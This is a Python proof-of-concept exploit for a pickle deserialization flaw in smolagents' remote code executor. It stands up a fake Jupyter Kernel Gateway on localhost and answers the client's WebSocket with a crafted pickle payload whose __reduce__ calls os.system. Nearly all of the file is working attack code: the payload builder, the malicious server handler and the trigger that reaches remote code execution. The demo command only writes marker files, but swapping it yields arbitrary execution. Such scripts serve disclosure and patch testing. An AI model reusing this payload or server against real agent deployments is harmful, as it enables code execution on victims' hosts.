#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : smolagents Pickle Deserialization — Self-Contained E2E
# CVE            : CVE-2025-14931
# Vendor         : Hugging Face
# Product        : smolagents
# Affected       : v1.10.0 through v1.24.0
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 10.0 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-12-23
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
smolagents Pickle Deserialization — Self-Contained End-to-End Exploit

Completely self-contained single-file exploit. Starts its own malicious
Jupyter Kernel Gateway in a background thread, connects vulnerable smolagents
code to it, and achieves RCE — no external lab infrastructure needed.

ATTACK CHAIN:
  1. Start minimal malicious Jupyter Kernel Gateway (HTTP + WebSocket)
  2. Craft malicious pickle payload using __reduce__ → os.system()
  3. Connect smolagents' _websocket_run_code_raise_errors() to server
  4. Server responds with FinalAnswerException containing payload
  5. smolagents calls pickle.loads() → RCE on host

PREREQUISITES:
  - smolagents==1.24.0 installed
  - websocket-client package
  - requests package

REFERENCES:
  - CVE-2025-14931
  - https://www.zerodayinitiative.com/advisories/ZDI-25-1143/
  - https://github.com/advisories/GHSA-q9r5-6hrr-9ph7
"""

import base64
import hashlib
import json
import os
import pickle
import socketserver
import struct
import sys
import threading
import time
import uuid

MARKER = "/tmp/poc_vector3_pwned"
PROOF_FILE = "/tmp/poc_vector3_proof.txt"
SERVER_HOST = "127.0.0.1"
SERVER_PORT = 0  # Let OS assign a free port


def banner():
    print("=" * 70)
    print("  CVE-2025-14931 — Vector 3: Self-Contained End-to-End Exploit")
    print("  No external servers needed — everything runs in this script")
    print("=" * 70)
    print()


def clean_markers():
    for f in [MARKER, PROOF_FILE]:
        if os.path.exists(f):
            os.remove(f)


# =========================================================================
# Malicious Pickle Payload
# =========================================================================

PICKLE_COMMAND = f"touch {MARKER} && echo VECTOR3_RCE_SUCCESS > {PROOF_FILE}"


def generate_malicious_payload() -> str:
    """Generate base64-encoded malicious pickle payload using __reduce__."""
    class RCE:
        def __reduce__(self):
            return (os.system, (PICKLE_COMMAND,))
    return base64.b64encode(pickle.dumps(RCE())).decode("ascii")


MALICIOUS_PAYLOAD = generate_malicious_payload()


# =========================================================================
# WebSocket frame helpers (RFC 6455)
# =========================================================================

def ws_send_text(sock, text: str):
    """Send a WebSocket text frame (unmasked, server-to-client)."""
    payload = text.encode("utf-8")
    frame = bytearray()
    frame.append(0x81)  # FIN + text opcode
    length = len(payload)
    if length < 126:
        frame.append(length)
    elif length < 65536:
        frame.append(126)
        frame.extend(struct.pack(">H", length))
    else:
        frame.append(127)
        frame.extend(struct.pack(">Q", length))
    frame.extend(payload)
    sock.sendall(bytes(frame))


def ws_recv_frame(rfile) -> str | None:
    """Read a WebSocket text frame from a buffered file reader."""
    try:
        header = rfile.read(2)
        if len(header) < 2:
            return None
        masked = bool(header[1] & 0x80)
        length = header[1] & 0x7F
        if length == 126:
            length = struct.unpack(">H", rfile.read(2))[0]
        elif length == 127:
            length = struct.unpack(">Q", rfile.read(8))[0]
        mask_key = rfile.read(4) if masked else b""
        payload = rfile.read(length)
        if masked:
            payload = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
        return payload.decode("utf-8")
    except Exception:
        return None


# =========================================================================
# Raw TCP Handler — full control over HTTP and WebSocket
# =========================================================================

class MaliciousHandler(socketserver.StreamRequestHandler):
    """
    Raw TCP handler that serves HTTP and WebSocket.
    Uses self.rfile/self.wfile from StreamRequestHandler for buffered I/O.
    """

    def handle(self):
        """Read one HTTP request and handle it."""
        # Read the request line
        request_line = self.rfile.readline(65536).decode("utf-8", errors="replace").strip()
        if not request_line:
            return

        parts = request_line.split(" ", 2)
        if len(parts) < 3:
            return
        method, path, _ = parts

        # Read headers
        headers = {}
        while True:
            line = self.rfile.readline(65536).decode("utf-8", errors="replace").strip()
            if not line:
                break
            if ":" in line:
                key, val = line.split(":", 1)
                headers[key.strip().lower()] = val.strip()

        if method == "GET" and path == "/api/kernelspecs":
            self._http_response(200, {
                "default": "python3",
                "kernelspecs": {"python3": {"name": "python3"}}
            })

        elif method == "POST" and path == "/api/kernels":
            self._http_response(201, {"id": str(uuid.uuid4()), "name": "python3"})

        elif method == "GET" and "/channels" in path:
            self._websocket_upgrade(headers)

        else:
            self._http_response(404, {"error": "not found"})

    def _http_response(self, status: int, body: dict):
        """Send an HTTP JSON response."""
        status_text = {200: "OK", 201: "Created", 404: "Not Found"}.get(status, "OK")
        body_bytes = json.dumps(body).encode("utf-8")
        response = (
            f"HTTP/1.1 {status} {status_text}\r\n"
            f"Content-Type: application/json\r\n"
            f"Content-Length: {len(body_bytes)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode("ascii") + body_bytes
        self.wfile.write(response)
        self.wfile.flush()

    def _websocket_upgrade(self, headers: dict):
        """Complete WebSocket handshake and send the malicious payload."""
        key = headers.get("sec-websocket-key", "")
        if not key:
            return

        # Compute accept per RFC 6455
        MAGIC = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
        accept = base64.b64encode(
            hashlib.sha1((key + MAGIC).encode()).digest()
        ).decode()

        # Send 101 Switching Protocols
        handshake = (
            "HTTP/1.1 101 Switching Protocols\r\n"
            "Upgrade: websocket\r\n"
            "Connection: Upgrade\r\n"
            f"Sec-WebSocket-Accept: {accept}\r\n"
            "\r\n"
        ).encode("ascii")
        self.wfile.write(handshake)
        self.wfile.flush()

        # Read client's execute_request WebSocket frame
        frame_text = ws_recv_frame(self.rfile)
        if frame_text is None:
            return

        try:
            msg = json.loads(frame_text)
            msg_id = msg.get("header", {}).get("msg_id", "unknown")
        except Exception:
            msg_id = "unknown"

        # Send malicious FinalAnswerException with pickle payload
        error_msg = json.dumps({
            "parent_header": {"msg_id": msg_id},
            "msg_type": "error",
            "header": {"msg_id": str(uuid.uuid4()), "msg_type": "error"},
            "metadata": {},
            "content": {
                "ename": "FinalAnswerException",
                "evalue": MALICIOUS_PAYLOAD,
                "traceback": ["FinalAnswerException: <pickled>"],
            },
        })
        ws_send_text(self.request, error_msg)

        # Send idle status to end client's receive loop
        idle_msg = json.dumps({
            "parent_header": {"msg_id": msg_id},
            "msg_type": "status",
            "header": {"msg_id": str(uuid.uuid4()), "msg_type": "status"},
            "metadata": {},
            "content": {"execution_state": "idle"},
        })
        ws_send_text(self.request, idle_msg)

        # Keep connection alive briefly for client to read
        time.sleep(0.5)


# =========================================================================
# Exploit Execution
# =========================================================================

def exploit() -> bool:
    """Run the full end-to-end exploit."""

    # Import smolagents vulnerable function
    try:
        from smolagents.remote_executors import _websocket_run_code_raise_errors
    except ImportError:
        print("[-] smolagents not installed — cannot run this PoC")
        return False

    try:
        import requests
        from websocket import create_connection
    except ImportError:
        print("[-] Missing dependencies (requests, websocket-client)")
        return False

    # -- Step 1: Generate the malicious payload --
    print("[1] Generating malicious pickle payload...")
    print(f"    Payload: {MALICIOUS_PAYLOAD[:50]}... ({len(MALICIOUS_PAYLOAD)} chars)")
    print(f"    Command: {PICKLE_COMMAND}")
    print()

    # -- Step 2: Start the malicious server --
    print("[2] Starting malicious Jupyter Kernel Gateway...")

    class ThreadedTCPServer(socketserver.ThreadingTCPServer):
        allow_reuse_address = True
        daemon_threads = True

    server = ThreadedTCPServer((SERVER_HOST, SERVER_PORT), MaliciousHandler)
    actual_port = server.server_address[1]
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    time.sleep(0.3)
    print(f"    [+] Server started on {SERVER_HOST}:{actual_port}")
    print()

    try:
        # -- Step 3: Connect as the victim (smolagents client) --
        base_url = f"http://{SERVER_HOST}:{actual_port}"

        print("[3] Connecting to malicious server (victim side)...")
        resp = requests.get(f"{base_url}/api/kernelspecs", timeout=5)
        assert resp.status_code == 200
        print("    [+] Server readiness confirmed")

        resp = requests.post(f"{base_url}/api/kernels", timeout=5)
        assert resp.status_code == 201
        kernel_id = resp.json()["id"]
        print(f"    [+] Kernel created: {kernel_id}")

        ws_url = f"ws://{SERVER_HOST}:{actual_port}/api/kernels/{kernel_id}/channels"
        ws = create_connection(ws_url, timeout=10)
        print("    [+] WebSocket connected")
        print()

        # -- Step 4: Trigger the vulnerable code path --
        print("[4] Triggering _websocket_run_code_raise_errors()...")
        print("    pickle.loads() will be called on the server's malicious payload")

        class PoCLogger:
            def log(self, msg, level=None):
                pass
            def log_error(self, msg):
                pass

        try:
            result = _websocket_run_code_raise_errors("print('pwned')", ws, PoCLogger())
            print(f"    [+] Returned: output={result.output}, is_final_answer={result.is_final_answer}")
        except Exception as e:
            print(f"    [!] Exception: {e}")

        ws.close()

    finally:
        server.shutdown()

    # -- Step 5: Verify --
    print()
    print("[5] Verifying RCE:")
    rce = False
    if os.path.exists(MARKER):
        print(f"    [!!!] {MARKER} EXISTS — RCE confirmed!")
        rce = True
    if os.path.exists(PROOF_FILE):
        content = open(PROOF_FILE).read().strip()
        print(f"    [!!!] {PROOF_FILE} contains: '{content}'")
        rce = True

    if not rce:
        print(f"    [ ] No marker files found — RCE not confirmed")

    print()
    print("=" * 70)
    if rce:
        print("  RESULT: SELF-CONTAINED EXPLOIT SUCCESSFUL")
        print()
        print("  A single script set up a malicious server, connected smolagents")
        print("  to it, and achieved arbitrary code execution via pickle.loads().")
        print("  No external infrastructure needed — full sandbox escape in one file.")
    else:
        print("  RESULT: RCE NOT CONFIRMED")
    print("=" * 70)

    return rce


if __name__ == "__main__":
    banner()
    clean_markers()
    success = exploit()
    sys.exit(0 if success else 1)
